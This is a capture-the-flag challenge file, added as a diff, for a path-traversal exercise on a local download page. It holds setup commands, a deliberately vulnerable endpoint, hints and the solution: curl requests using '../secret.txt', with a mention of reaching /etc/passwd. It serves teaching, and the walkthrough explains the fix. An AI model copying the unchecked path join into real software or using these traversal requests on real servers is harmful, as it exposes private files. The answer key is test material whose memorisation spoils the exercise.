@@ -1,0 +1,55 @@
+title: Climbing out of the folder
+level: Advanced
+kind: Web
+topic: Web
+teaser: a download page that doesn't check what it is given
+points: 80
+order: 44
+packages: httpd
+answer: flag
+var: DOCDIR = pick:docs|files|public|downloads
+
+@intro
+A document download page at http://localhost/get?file=NAME serves files from one
+folder. It joins your file name to the folder without checking it, so a name full of
+".." climbs out and reaches files it shouldn't. A secret file sits above the folder;
+read it.
+
+@setup
+systemctl enable --now httpd
+mkdir -p /var/www/{{DOCDIR}}
+echo 'Welcome to the handbook.' > /var/www/{{DOCDIR}}/handbook.txt
+echo '{{FLAG}}' > /var/www/secret.txt
+chown apache:apache /var/www/secret.txt
+chmod 640 /var/www/secret.txt
+
+@web
+[
+  { "path": "/get", "kind": "file", "param": "file", "base": "/var/www/{{DOCDIR}}", "runAs": "apache",
+    "title": "Document download", "body": "<h1>Documents</h1><p>Get a file: /get?file=handbook.txt</p>" }
+]
+
+@solution
+curl -s "http://localhost/get?file=handbook.txt"
+curl -s "http://localhost/get?file=../secret.txt"
+
+@walkthrough
+A normal request works:
+
+    curl -s "http://localhost/get?file=handbook.txt"
+
+The page joins your name to its folder (/var/www/{{DOCDIR}}) without removing "..", so
+"../" steps up one folder:
+
+    curl -s "http://localhost/get?file=../secret.txt"
+
+reads /var/www/secret.txt, which was never meant to be downloadable. (Deeper paths like
+../../../../etc/passwd reach anything the web server's account can read.) The fix is to
+reject "..", resolve the real path, and confirm it stays inside the allowed folder.
+
+@hint 14
+The file name is joined to a folder with no checking. What happens if you include ../
+to step up a folder?
+
+@hint 26
+curl -s "http://localhost/get?file=../secret.txt" reads the file one level up.
